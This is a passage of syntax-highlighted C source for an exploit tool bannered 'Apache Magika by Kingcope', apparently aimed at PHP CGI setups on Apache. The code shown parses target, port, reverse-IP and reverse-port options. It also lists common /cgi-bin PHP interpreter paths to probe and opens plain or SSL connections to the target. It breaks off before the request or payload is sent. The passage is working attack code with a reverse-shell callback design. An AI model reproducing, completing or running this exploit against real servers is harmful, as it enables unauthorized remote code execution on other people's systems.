<span class="o">&gt;</span>   <span class="kt">int</span> <span class="n">received</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">count2</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>   <span class="k">for</span><span class="p">(;;)</span>
<span class="o">&gt;</span>   <span class="p">{</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rc</span><span class="p">)</span>
<span class="o">&gt;</span>     <span class="n">rc</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="k">else</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="n">count2</span> <span class="o">%</span> <span class="mi">1024</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">rc</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="p">(</span><span class="n">count2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="n">received</span> <span class="o">=</span> <span class="n">SSL_read</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="n">received</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">rc</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="n">count2</span><span class="o">++</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="k">if</span> <span class="p">(</span><span class="n">count2</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>
<span class="o">&gt;</span>       <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="k">else</span>
<span class="o">&gt;</span>      <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   <span class="k">return</span> <span class="n">rc</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span>
<span class="o">&gt;</span> <span class="p">{</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="o">*</span><span class="n">rc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">int</span> <span class="n">received</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">count2</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>   <span class="k">for</span><span class="p">(;;)</span>
<span class="o">&gt;</span>   <span class="p">{</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rc</span><span class="p">)</span>
<span class="o">&gt;</span>     <span class="n">rc</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="k">else</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="n">count2</span> <span class="o">%</span> <span class="mi">1024</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">rc</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="p">(</span><span class="n">count2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="n">received</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="n">received</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">rc</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="n">count2</span><span class="o">++</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="k">if</span> <span class="p">(</span><span class="n">count2</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>
<span class="o">&gt;</span>       <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="k">else</span>
<span class="o">&gt;</span>      <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   <span class="k">return</span> <span class="n">rc</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="kt">void</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="o">&gt;</span> <span class="p">{</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="o">*</span><span class="n">target</span><span class="p">,</span> <span class="o">*</span><span class="n">protocol</span><span class="p">,</span> <span class="o">*</span><span class="n">targetip</span><span class="p">,</span> <span class="o">*</span><span class="n">writestr</span><span class="p">,</span> <span class="o">*</span><span class="n">tmpstr</span><span class="p">,</span> <span class="o">*</span><span class="n">readbuf</span><span class="o">=</span><span class="nb">NULL</span><span class="p">,</span>
<span class="o">&gt;</span>    <span class="o">*</span><span class="n">interpreter</span><span class="p">,</span> <span class="o">*</span><span class="n">reverseip</span><span class="p">,</span> <span class="o">*</span><span class="n">reverseportstr</span><span class="p">,</span> <span class="o">*</span><span class="n">forceinterpreter</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="n">httpsflag</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">port</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">reverseport</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="n">server</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">writesize</span><span class="p">,</span> <span class="n">tmpsize</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="n">connection</span> <span class="o">*</span><span class="n">sslconnection</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"-== Apache Magika by Kingcope ==-</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="k">for</span><span class="p">(;;)</span>
<span class="o">&gt;</span>   <span class="p">{</span>
<span class="o">&gt;</span>      <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="kt">int</span> <span class="n">option_index</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="o">&gt;</span>      <span class="k">static</span> <span class="k">struct</span> <span class="n">option</span> <span class="n">long_options</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"target"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"port"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"protocol"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"reverse-ip"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"reverse-port"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>
<span class="o">&gt;</span>        <span class="p">{</span><span class="s">"force-interpreter"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">},</span>      
<span class="o">&gt;</span>        <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">}</span>
<span class="o">&gt;</span>       <span class="p">};</span>
<span class="o">&gt;</span>      
<span class="o">&gt;</span>      <span class="n">c</span> <span class="o">=</span> <span class="n">getopt_long</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="n">long_options</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option_index</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>      
<span class="o">&gt;</span>      <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
<span class="o">&gt;</span>       <span class="k">switch</span> <span class="p">(</span><span class="n">option_index</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="n">optarg</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>          <span class="n">target</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>           <span class="n">printf</span><span class="p">(</span><span class="s">"calloc error (2)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>           <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>          <span class="p">}</span>
<span class="o">&gt;</span>          <span class="n">memcpy</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">optarg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="p">}</span>
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="k">if</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span>
<span class="o">&gt;</span>          <span class="n">port</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">optarg</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="n">protocol</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">protocol</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>          <span class="n">printf</span><span class="p">(</span><span class="s">"calloc error (3)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>          <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="p">}</span>
<span class="o">&gt;</span>         <span class="n">memcpy</span><span class="p">(</span><span class="n">protocol</span><span class="p">,</span> <span class="n">optarg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">protocol</span><span class="p">,</span> <span class="s">"https"</span><span class="p">))</span>
<span class="o">&gt;</span>          <span class="n">httpsflag</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="n">reverseip</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">reverseip</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>          <span class="n">printf</span><span class="p">(</span><span class="s">"calloc error (4)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>          <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="p">}</span>
<span class="o">&gt;</span>         <span class="n">memcpy</span><span class="p">(</span><span class="n">reverseip</span><span class="p">,</span> <span class="n">optarg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>       
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="n">reverseport</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">optarg</span><span class="p">);</span>       
<span class="o">&gt;</span>         <span class="n">reverseportstr</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">reverseportstr</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>          <span class="n">printf</span><span class="p">(</span><span class="s">"calloc error (5)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>          <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="p">}</span>
<span class="o">&gt;</span>         <span class="n">memcpy</span><span class="p">(</span><span class="n">reverseportstr</span><span class="p">,</span> <span class="n">optarg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>        
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
<span class="o">&gt;</span>         <span class="n">forceinterpreter</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">forceinterpreter</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>          <span class="n">printf</span><span class="p">(</span><span class="s">"calloc error (6)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>          <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>         <span class="p">}</span>
<span class="o">&gt;</span>         <span class="n">memcpy</span><span class="p">(</span><span class="n">forceinterpreter</span><span class="p">,</span> <span class="n">optarg</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">optarg</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>       
<span class="o">&gt;</span>         <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>        <span class="k">default</span><span class="o">:</span>
<span class="o">&gt;</span>         <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">);</span>
<span class="o">&gt;</span>       <span class="p">}</span>
<span class="o">&gt;</span>       <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>      
<span class="o">&gt;</span>      <span class="k">default</span><span class="o">:</span>
<span class="o">&gt;</span>       <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="p">}</span>
<span class="o">&gt;</span>   <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>   <span class="k">if</span> <span class="p">((</span><span class="n">optind</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">target</span> <span class="o">||</span> <span class="o">!</span><span class="n">protocol</span> <span class="o">||</span> <span class="o">!</span><span class="n">port</span> <span class="o">||</span>
<span class="o">&gt;</span>       <span class="o">!</span><span class="n">reverseip</span> <span class="o">||</span> <span class="o">!</span><span class="n">reverseport</span><span class="p">){</span>
<span class="o">&gt;</span>     <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="p">}</span>
<span class="o">&gt;</span>   
<span class="o">&gt;</span>   <span class="n">server</span> <span class="o">=</span> <span class="n">gethostbyname_</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">server</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>    <span class="n">printf</span><span class="p">(</span><span class="s">"Error while resolving hostname. (7)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="o">*</span><span class="n">interpreters</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="o">&gt;</span>   <span class="kt">int</span> <span class="n">ninterpreters</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
<span class="o">&gt;</span>   <span class="n">interpreters</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"/cgi-bin/php"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="n">interpreters</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"/cgi-bin/php5"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="n">interpreters</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"/cgi-bin/php-cgi"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="n">interpreters</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"/cgi-bin/php.cgi"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="n">interpreters</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">"/cgi-bin/php4"</span><span class="p">);</span>
<span class="o">&gt;</span>   
<span class="o">&gt;</span>   <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ninterpreters</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>    <span class="n">interpreter</span> <span class="o">=</span> <span class="n">interpreters</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">forceinterpreter</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">interpreter</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">forceinterpreter</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">forceinterpreter</span> <span class="o">&amp;&amp;</span> <span class="n">i</span><span class="p">)</span>
<span class="o">&gt;</span>     <span class="k">break</span><span class="p">;</span>
<span class="o">&gt;</span>    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">interpreter</span><span class="p">);</span>
<span class="o">&gt;</span>    
<span class="o">&gt;</span>    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">sockfd</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> 
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"socket error (8)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"connect error (9)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>    
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">httpsflag</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>     <span class="n">sslconnection</span> <span class="o">=</span> <span class="p">(</span><span class="n">connection</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">connection</span><span class="p">));</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sslconnection</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"malloc error (10)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>   
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="o">&gt;</span>     <span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">ctx</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>     <span class="n">SSL_library_init</span><span class="p">();</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>     <span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">SSL_CTX_new</span><span class="p">(</span><span class="n">SSLv23_client_method</span><span class="p">());</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"SSL_CTX_new error (11)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span>     <span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span> <span class="o">=</span> <span class="n">SSL_new</span><span class="p">(</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">ctx</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"SSL_new error (12)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>   
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SSL_set_fd</span><span class="p">(</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">))</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"SSL_set_fd error (13)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>    
<span class="o">&gt;</span>     <span class="k">if</span> <span class="p">(</span><span class="n">SSL_connect</span><span class="p">(</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"SSL_connect error (14)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>      <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>       
<span class="o">&gt;</span>     <span class="p">}</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   
